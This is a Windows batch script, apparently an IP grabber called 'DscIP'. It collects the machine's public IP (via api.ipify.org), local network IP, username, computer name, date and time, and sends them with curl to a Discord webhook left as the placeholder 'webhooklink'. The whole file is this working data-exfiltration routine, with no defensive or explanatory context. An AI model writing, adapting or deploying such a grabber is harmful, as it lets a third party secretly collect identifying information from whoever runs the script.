@echo off




Rem Setting
SET WEBHOOK_URL=webhooklink
SET Provide_additional_information=TRUE


















































Rem PublicIP
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
Rem NetIP
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a




Rem T/F Check
if %Provide_additional_information%==TRUE goto O
if %Provide_additional_information%==FALSE goto X
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"https://media.discordapp.net/attachments/967661026726273074/973857806816014346/-001_-_2022-05-11T170300.675.png\"}" %WEBHOOK_URL%
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Error : 1```\"}" %WEBHOOK_URL%
Rem Error 1
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```wrong value```\"}" %WEBHOOK_URL%
goto quit



Rem hook(x)
:X
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"https://media.discordapp.net/attachments/802039875901587466/973572853012238416/-001_100.png?width=1026^&height=207\"}" %WEBHOOK_URL%
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Public IP : %PublicIP%,NetworkIP : %NetworkIP% ```\"}" %WEBHOOK_URL%
goto quit



Rem hook(O)
:O
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"https://media.discordapp.net/attachments/802039875901587466/973572853012238416/-001_100.png?width=1026^&height=207\"}" %WEBHOOK_URL%
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Public IP : %PublicIP%,NetworkIP : %NetworkIP% ```\"}" %WEBHOOK_URL%
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```---------------------------------------------------------------------------```\"}" %WEBHOOK_URL%
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Name Infrom [ Username : %username%, ComputerName : %computername% ]```\"}" %WEBHOOK_URL%
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```Time Infrom [ Date,Time : %date% %time% ]```\"}" %WEBHOOK_URL%
curl -H "Content-Type: application/json" -d "{\"username\": \"DscIP\", \"content\":\"```---------------------------------------------------------------------------```\"}" %WEBHOOK_URL%
goto quit








:quit
